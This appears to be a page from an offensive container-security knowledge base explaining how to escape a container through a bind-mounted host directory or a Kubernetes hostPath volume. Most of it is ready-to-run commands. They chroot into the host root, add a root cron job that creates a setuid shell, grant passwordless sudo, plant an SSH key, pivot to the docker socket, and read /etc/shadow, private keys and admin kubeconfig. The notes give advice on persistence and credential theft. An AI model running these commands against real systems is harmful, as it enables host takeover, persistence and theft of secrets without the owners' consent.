---
title: "Host path mount: using a bind-mounted host directory to reach the host"
description: "A container given a bind mount of a host directory, or the entire host root at a path like /host, can read and write those host files directly. Depending on which directory is exposed, an attacker reads secrets, writes a cron job or SSH key, edits a systemd unit, or escalates through a mounted /etc or /root, with the full host root being an immediate takeover."
keywords:
  - hostpath mount
  - bind mount
  - host filesystem
  - kubernetes hostpath
  - container escape
---

# Host path mount

A bind mount maps a host directory into the container, and the files behind it are the host's real files, not copies. The escape severity depends entirely on which directory was mounted and whether it is writable. A mount of the whole host root at `/host` is an immediate takeover; a narrower mount of `/etc`, `/root`, `/var/run`, or a cloud credentials directory is often just as good because of what those directories let you overwrite or read. In Kubernetes this is a `hostPath` volume, one of the most common pod-to-node escapes.

Find the host mount and test writability:

```bash
findmnt -o TARGET,SOURCE,OPTIONS | grep -vE 'overlay|tmpfs|proc|sysfs|cgroup'
# a line whose SOURCE is a host subtree (e.g. /var/lib/..[/host/etc]) is a bind mount
ls -la /host 2>/dev/null; touch /host/etc/.w 2>/dev/null && echo writable
```

## Routes by what is mounted

```bash
# Full host root at /host: chroot straight in
chroot /host /bin/bash

# Host /etc writable: schedule a root job or grant sudo
echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /host/cron.d/w
echo 'nobody ALL=(ALL) NOPASSWD: ALL' > /host/sudoers.d/w

# Host /root or a user home: plant an SSH key
mkdir -p /host/root/.ssh && echo 'ssh-ed25519 AAAA... a' >> /host/root/.ssh/authorized_keys

# Host /var/run or /run: often contains the container runtime socket
ls -l /host/var/run/docker.sock       # pivot to the runtime-socket route

# Read-only mount: still valuable for secrets
cat /host/etc/shadow /host/root/.ssh/id_* /host/etc/kubernetes/admin.conf 2>/dev/null
```

## Exploitation notes

- A read-only host mount blocks writes but still exposes secrets; prioritise private keys, `/etc/shadow`, kubeconfig and kubelet files, and cloud credential files for onward movement.
- Prefer a deterministic persistence write (cron, sudoers, authorized_keys) over editing a live binary or config that a running service holds open.
- In Kubernetes, a `hostPath` of `/` or `/var/lib/kubelet` is a node takeover; see [hostPath mount](../../../orchestration/kubernetes/pod-escape-to-node/hostpath-mount.md) for the pod-delivery view.

## References

- [BishopFox: bad pods / hostPath](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
- [Kubernetes: hostPath volumes](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
- [HackTricks: sensitive mounts](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts)
